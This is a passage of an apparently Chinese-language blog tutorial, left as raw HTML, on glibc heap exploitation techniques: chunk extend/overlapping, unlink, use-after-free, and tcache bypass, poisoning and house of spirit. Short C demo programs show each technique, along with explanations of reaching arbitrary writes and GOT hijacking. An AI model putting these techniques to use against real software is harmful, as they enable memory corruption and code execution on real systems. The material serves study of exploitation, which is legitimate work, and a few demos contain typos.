class="hljs-built_in">free</span>(ptr1);<br>    pre3 = malooc(<span class="hljs-number">0x30</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>两次 malloc 后堆块中的数据是这样的</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extend-gdb1.png"></p><p>修改了 ptr1 的 size 位后对应变成了 41</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extend-gdb2.png"></p><p>我们 free 掉它之后， 也对应进入了 0x40 的 bin 中</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extend-gdb3.png"></p><p>此时我们再次分配 0x30 的堆块就会把原本属于 ptr2 头部的内存分配到 ptr3 中，</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extend-gdb4.png"></p><p>此时原本 chunk2 的头部是现在 ptr3 的用户内容，我们可以直接控制其内容，这种状态就叫做 overlapping chunk。</p><h5 id="🌰2：对-inuse-的-unsortedbin-进行-extend"><a href="#🌰2：对-inuse-的-unsortedbin-进行-extend" class="headerlink" title="🌰2：对 inuse 的 unsortedbin 进行 extend"></a>🌰2：对 inuse 的 unsortedbin 进行 extend</h5><p>我们知道处于 fastbin 范围的 chunk 释放后会被置入 fastbin 链表中，而不处于这个范围的 chunk 被释放后会被置于 unsorted bin 链表中。</p><p>接下来我们就使用 0x80 来分配堆。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">void</span> *ptr1,*ptr2,*ptr3;<br>    ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);      <span class="hljs-comment">//防止与top chunk合并</span><br>    <br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">int</span>)ptr1<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0xb1</span>;<br>    <span class="hljs-built_in">free</span>(ptr1);<br>    ptr3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>在这个例子中，因为分配的 size 不处于 fastbin 的范围，因此在释放时如果与 top chunk 相连会导致和 top chunk 合并。所以我们需要额外分配一个 chunk，把释放的块与 top chunk 隔开。</p></blockquote><p>三次 malloc 分配完以后，内存中的数据如下：</p><p><img src="D:/笔记/PWN/堆/精美配图/unsortedextend-gdb1.png"></p><p>修改size 数据后ptr1 和 ptr2 合并，如下：</p><p><img src="D:/笔记/PWN/堆/精美配图/unsortedextend-gdb2.png"></p><p>相应的 free 后进入了 unsorted bin</p><p><img src="D:/笔记/PWN/堆/精美配图/unsortedextend-gdb3.png"></p><p>再次分配我们就达到了overlapping chunk的目的。</p><h5 id="🌰3：对-free-的-unsortedbin-进行-extend"><a href="#🌰3：对-free-的-unsortedbin-进行-extend" class="headerlink" title="🌰3：对 free 的 unsortedbin 进行 extend"></a>🌰3：对 free 的 unsortedbin 进行 extend</h5><blockquote><p>在例二的基础上进行，先释放 chunk ，再修改</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">void</span> *ptr1,*ptr2,*ptr3;<br>    ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);      <span class="hljs-comment">//防止与top chunk合并</span><br>    <br>    <span class="hljs-built_in">free</span>(ptr1);<br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">int</span>)ptr1<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0xb1</span>;<br>    ptr3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>三次 malloc 之后的结果如下</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/freesortedextend-gdb1.png"></p><p>释放 ptr1 后，chunk 进入 unsortedbin</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/freesortedextend-gdb2.png"></p><p>修改 size 字段</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/freesortedextend-gdb3.png"></p><p>再次分配，ptr2 头部被分配进新的堆块，我们就这样控制了 ptr2 的内容</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/freesortedextend-gdb4.png"></p><h5 id="🌰4：通过-extend-向后-overlapping"><a href="#🌰4：通过-extend-向后-overlapping" class="headerlink" title="🌰4：通过 extend 向后 overlapping"></a>🌰4：通过 extend 向后 overlapping</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">void</span> *ptr1,*ptr2;<br><br>    ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">int</span>)ptr<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x61</span>;<br>    <span class="hljs-built_in">free</span>(ptr1);<br>    <span class="hljs-built_in">free</span>(ptr2);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x50</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 malloc(0x50) 对 extend 区域重新占位后，其中 0x10 的 fastbin 块依然可以正常的分配和释放，此时已经构成 overlapping，通过对 overlapping 的进行操作可以实现 fastbin attack。</p><p>就像上面的例子，我们在两次free后可以发现bin 中出现了overlapping。</p><p>第一轮的 malloc 结束</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap-gdb1.png"></p><p>修改 ptr1 的 size</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap-gdb2.png"></p><p>两次 free，bin 中出现了overlapping。</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap-gdb3.png"></p><p>而接下来的两次 malloc ，“ 两块 ” chunk 也被一次分配了</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap-gdb4.png"></p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap-gdb5.png"></p><h5 id="🌰5：通过-extend-向前-overlapping"><a href="#🌰5：通过-extend-向前-overlapping" class="headerlink" title="🌰5：通过 extend 向前 overlapping"></a>🌰5：通过 extend 向前 overlapping</h5><p>前向 extend 利用了 smallbin 的 unlink 机制，通过修改 pre_size 域可以跨越多个 chunk 进行合并实现 overlapping。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> *ptr1,*ptr2,*ptr3,*ptr4;<br>    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);      <span class="hljs-comment">//smallbin1</span><br>    ptr2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);    <span class="hljs-comment">//fastbin1</span><br>    ptr3=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);    <span class="hljs-comment">//fastbin2</span><br>    ptr4=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);     <span class="hljs-comment">//smallbin2</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);    <span class="hljs-comment">//防止与top合并</span><br>    <span class="hljs-built_in">free</span>(ptr1);<br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr4<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x90</span>;  <span class="hljs-comment">//修改pre_inuse域</span><br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr4<span class="hljs-number">-0x10</span>)=<span class="hljs-number">0xd0</span>;  <span class="hljs-comment">//修改pre_size域</span><br>    <span class="hljs-built_in">free</span>(ptr4);  <span class="hljs-comment">//unlink进行前向extend</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x150</span>);  <span class="hljs-comment">//占位块</span><br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>第一次free后的堆结构如下</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap2-gdb2.png"></p><p>对数据进行修改后 <code>free(ptr4)</code> 可以发现 chunk 被合并了</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap2-gdb3.png"></p><h1 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h1><p>unlink 机制的存在是为了防止内存过度碎片化。当一个 chunk 被释放时，该 chunk 非 fastbin 或 tcache bin ，libc 就会检查该堆块前后是否有 chunk 属于被释放的状态，如果存在，就会将他们从 bin 中取出进行合并，即使这些前后的堆块是在 fast bin 或者 tcache bin 中。</p><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>unlink 的过程就类似于把双向链表中间的空闲 chunk 取出来，具体流程如下：</p><p>最初 bin 中的堆块像最上图那样链接，P 是我们释放的堆块， BK 是 P 对应链表前方的堆块， FD 是后面的堆块。unlink 结束后就变成了最下图，此时p 在 FD 的 data 中，然后 BK 和 FD 直接相连。</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unlink_intro.png"></p><p>我们先从已经被淘汰的防护时的 unlink 开始学习其原理</p><h5 id="被淘汰的-unlink"><a href="#被淘汰的-unlink" class="headerlink" title="被淘汰的 unlink"></a>被淘汰的 unlink</h5><p>我们假设堆内的结构如以下左图，现在有物理空间连续的两个 chunk（Q，Nextchunk），其中 Q 处于使用状态、Nextchunk 处于释放状态。</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/old_unlink_vul.png"></p><p>那么如果我们通过某种方式（比如溢出）将 Nextchunk 的 fd 和 bk 指针修改为指定的值。则当我们 free(Q) 时，会依次进行下面的操作：</p><ul><li>glibc 判断这个块属于 small chunk</li><li>判断是否需要向前合并，发现前一个 chunk 处于使用状态，不需要向前合并</li><li>判断是否需要向后合并，后一个 chunk 空闲，需要合并</li><li>进行 unlink 操作</li></ul><p> unlink 具体执行的效果如下：</p><ul><li><p><code>FD = P-&gt;fd = target addr - 12</code>  ，即将 <em>FD</em> 字段赋值为堆块 P 的 <em>fd</em> 字段所存储的数据 target addr - 12 </p></li><li><p><code>BK = P-&gt;bk = expect value</code> ，即将 <em>BK</em> 字段赋值为堆块 P 的 <em>bk</em> 字段所存储的数据 expect value （我们预期改写的数据）。</p></li><li><p><code>FD-&gt;bk = BK</code> ，即将 <em>target addr - 12 + 12</em> 处的内容（ target addr 本身）设置为 expect value。</p></li><li><p><code>BK-&gt;fd = FD</code>，即将 <em>expect value + 8</em> 处的内容设置为 target addr - 12。</p></li></ul><p>在这里我们需要确保 expect value + 8 处的地址具有可写的权限，否则可能无法成功利用该漏洞。</p><p>成功执行 unlink 漏洞利用后，会将目标地址处的值设置为我们预期的内容，从而实现任意地址写操作。</p><p>我们可以利用这个漏洞来将某个 GOT 表项指向系统函数或者我们想要调用的函数，从而劫持程序执行流程。但是需要注意的是，expect value + 8 处的值也会被破坏，可能会影响程序的正常执行，因此在利用漏洞时需要仔细考虑和处理这些影响。</p><h3 id="当前的-unlink"><a href="#当前的-unlink" class="headerlink" title="当前的 unlink"></a>当前的 unlink</h3><p>哈哈哈，怎么会这么简单呢🤪</p><p>现在的 unlink 实现之前会对 chunk 的 size 和双向链表进行检查 ，具体代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 检查 P 的大小是否与其相邻堆块的 prev_size 字段一致（size检查）</span><br><span class="hljs-keyword">if</span> (__builtin_expect(chunksize(P) != prev_size(next_chunk(P)), <span class="hljs-number">0</span>)) <br>&#123;<br>    malloc_printerr(<span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// 检查 P 的 fd 和 bk 指针是否与其前后双向链表节点的指针一致（双向链表完整性检查）</span><br><span class="hljs-keyword">if</span> (__builtin_expect(FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>)) <br>&#123;<br>    malloc_printerr(check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);<br>&#125;<br><br><span class="hljs-comment">// 在 largebin 中，检查 P 的 next_size 指针是否与其前后双向链表节点的指针一致（双向链表完整性检查）</span><br><span class="hljs-keyword">if</span> (__builtin_expect(P-&gt;fd_nextsize-&gt;bk_nextsize != P || P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="hljs-number">0</span>)) <br>&#123;<br>    malloc_printerr(check_action, <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>, P, AV);<br>&#125;<br></code></pre></td></tr></table></figure><p>其中就有对 fd 和 bk 的检查。而上面的情况中，就会被检查出来，我们无法使用这种方法。</p><p>但是我们可以伪造堆块来绕过检查😎，我们有一个公式：</p><ol><li>P -&gt; fd -&gt; bk &#x3D;&#x3D; P &lt;&#x3D;&gt; *( P -&gt; fd + 0x18 ) &#x3D;&#x3D; P</li><li>p -&gt; bk -&gt; fd &#x3D;&#x3D; P &lt;&#x3D;&gt; *( p -&gt; bk + 0x10 ) &#x3D;&#x3D; P</li></ol><p>简单点说就是：</p><ol><li><strong>P -&gt; fd &#x3D; &amp; P - 0x18</strong></li><li><strong>P -&gt; bk &#x3D; &amp; P - 0x10</strong></li></ol><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unlink.png"></p><p>触发unlink后P处的指针会变为 P-0x18 。</p><p>如果将上面说的P变为我们想要修改的地址比如保存指针的数组地址，利用上面说到的 unlink 就能控制数组中的指针，并且我们使指针保存类似 free_got、puts_got 等，之后我们修改指针使其为 system_got ，那么下次我们调用其他函数就会调用 system（）。</p><h1 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h1><p>Use After Free 就是内存块被释放以后再次被利用，有以下几种情况：</p><ul><li>内存块被释放后，其对应的指针被设置为 NULL，再次利用时程序就会崩溃</li><li>内存块被释放后，其对应的指针没有被设置为 NULL ，而且然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序可以正常运转。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现问题。</li></ul><p>我们一般所指的 Use After Free 漏洞主要是后两种。此外，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer （它的中文翻译叫迷途指针😊）。</p><p>它的实际应用就是我们在像是 chunk extend 里面用到的示例2</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">void</span> *ptr1,*ptr2,*ptr3;<br>    ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);      <span class="hljs-comment">//防止与top chunk合并</span><br>    <br>    <span class="hljs-built_in">free</span>(ptr1);<br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">int</span>)ptr1<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0xb1</span>;  <span class="hljs-comment">// Use After Free</span><br>    ptr3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);  <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Tcache-attack"><a href="#Tcache-attack" class="headerlink" title="Tcache attack"></a>Tcache attack</h1><blockquote><p>这一部分我的环境是Ubuntu18 libc2.27</p></blockquote><h3 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h3><p>Tcache 全名为 Thread Local Caching，在 libc2.26 之后才出现。它为每个线程创建一个缓存，里面包含了一些小堆块。</p><p>Tcache bin 是单链表的数据结构，存储相同大小的空闲堆块，size大小范围是 0x20-0x410，允许存放的 chunk 数为7。当你使用 <code>free()</code> 函数释放一个堆块时，glibc 会将该堆块放入适当大小类别的 Tcache bin 中，以备后续再次分配。Tcache bin 采用先进后出的策略，且 prev_inuse 位不会被合并，也就是说 tcache bin 中的 chunk 不会被合并。</p><h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>在有了 tcache 机制以后，无论是分配还是释放堆块，tcache 都是首先被利用的，直到达到每一中 bin 的上限 7 为止。还有一种情况就是 fast bin 或者 small bin 返回了一个堆块，且 tcache 对应大小的 bin 中未满的话，那么该fast bin 或者 samll bin 链中的堆块会被加入到对应 tcache bin 中直至其上限。</p><h4 id="绕过-Tcache"><a href="#绕过-Tcache" class="headerlink" title="绕过 Tcache"></a>绕过 Tcache</h4><p>Tcache 机制无非就是增加了一层缓存，绕过 Tcache 就是我们手动构造填充堆块填满某一个大小对应的 thcache bin 链表，使得在再次回收的 bin 进入unsorted bin 或者 small bin，large bin 等等，再利用这些 bin 得到 libc 基址。</p><p>原理大致如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr[<span class="hljs-number">7</span>];<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br><span class="hljs-comment">// 申请7个，释放7个，填满tcache bin[0x90]</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++)<br>        ptr[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++)<br>        <span class="hljs-built_in">free</span>(ptr[i]);<br>    <span class="hljs-comment">// 这里再释放a，就会放入到unsorted bin中</span><br>    <span class="hljs-built_in">free</span>(a);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;libc addr is %llx\n&quot;</span>,  *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>*)a);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/thcache-bypass.png"></p><p>如上我们就泄露出了 main_arena 的地址，接下来就可以通过ret2libc时用到的套路泄露libc基址进而调用目标函数啦。</p><h4 id="分配堆到指定的地址"><a href="#分配堆到指定的地址" class="headerlink" title="分配堆到指定的地址"></a>分配堆到指定的地址</h4><p>在堆的利用中，我们经常会需要把堆的指针分配到我们想要的地址上去，比如BSS段或者直接指向栈空间实现程序流的操控，抑或是将堆块重新分配。</p><p>我们可以通过以下几种方法实现：</p><h5 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h5><p>tcache poisoning的利用思路如下：</p><ul><li><p>分配一个目标大小的堆块，再将其释放</p></li><li><p>利用堆溢出等漏洞，将刚刚释放的堆块的某个指针（例如 <code>fd</code> 或 <code>bk</code> ）修改为我们可控的地址指针（如 <code>__free_hook </code>或 <code>__malloc_hook</code> 等局部变量的地址）。</p></li><li><p>再次建立相同大小的堆块并释放，这样该堆块的内容会被认为是一个有效的 tcache 链表节点。</p></li><li><p>再次建立相同大小的堆块，此时 tcache 会将之前填充的目标指针地址作为返回值返回给调用者，我们可以在这段地址内写入攻击代码，程序执行到目标地址，就可以实现任意代码执行。</p><blockquote><p>因为 fd 指针会返回空闲堆块地址给程序，而这个地址被我们替换成了目标地址，所以实际上返回值是目标地</p></blockquote></li></ul><p> 原理大致如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> localVariables ;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;localVariables addr is %p\n&quot;</span>, &amp;localVariables);<br><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> * ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc ptr addr is %p\n&quot;</span>, ptr);<br>    <span class="hljs-built_in">free</span>(ptr);<br>    <span class="hljs-comment">// 只需修改fd指针，申请的大小和当前tcache bin大小相同即可</span><br>    ptr[<span class="hljs-number">0</span>] = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)&amp;localVariables;<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the second malloc addr is %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/tcachePoisoning.png"></p><h5 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache house of spirit"></a>tcache house of spirit</h5><p>tcache house of spirit 这种利用方式是由于 tcache_put() 函数检查不严格导致的，在释放的时候没有检查被释放的指针是否真的是堆块的 malloc 指针，我们就可以伪造一个 fake_chunk 来跳转到目标地址。</p><p>利用思路是伪造一个 size 符合 tcache bin size 的 fake_chunk ，使程序在释放时误以为他们属于 tcache 的管理范围，就实现了任意地址的目的的。</p><p>原理大致如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> fck[<span 